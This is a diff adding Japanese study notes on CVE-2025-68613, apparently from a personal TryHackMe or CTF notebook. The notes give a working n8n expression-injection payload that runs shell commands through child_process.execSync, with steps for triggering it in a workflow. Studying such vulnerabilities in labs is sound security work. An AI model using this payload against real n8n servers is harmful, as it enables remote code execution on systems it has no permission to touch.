@@ -75,6 +75,31 @@ Content-Disposition: form-data; name="2"
 ------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
 ```
 
+## [CVE-2025-68613](https://nvd.nist.gov/vuln/detail/CVE-2025-68613) (n8n)
+
+https://tryhackme.com/room/n8ncve202568613
+
+n8nは、アプリケーションとサービスを視覚的に接続し、タスクを自動化するために設計されたオープンソースのワークフロー自動化プラットフォーム。ユーザーは、APIリクエストの発行、データの処理、メールの送信などのアクションを表すノードで構成されるワークフローを構築する。Node.js ベース。
+
+- `0.211.0 - 1.120.3` のバージョンにRCEの脆弱性
+- 認証が必要
+- n8n は、適切なサンドボックス化や入力検証を行わずに、二重中括弧 `{{ }}` で囲まれたユーザー入力をJavaScript コードとして処理する
+
+### エクスプロイト
+
+https://github.com/wioui/n8n-CVE-2025-68613-exploit
+
+```js
+{{ (function(){ return this.process.mainModule.require('child_process').execSync('id').toString() })() }}
+```
+
+手順
+
+1. ワークフローに「Manual Trigger」を追加
+2. 追加ボタンを押して「Edit Field」を検索＆選択
+3. 「Add Field」を選択、文字列の値としてペイロードを設定
+4. ステップ実行
+
 ## [CVE-2025-29927](https://www.exploit-db.com/exploits/52124)  (Next.js)
 
 - Next.js Middleware 認証バイパス
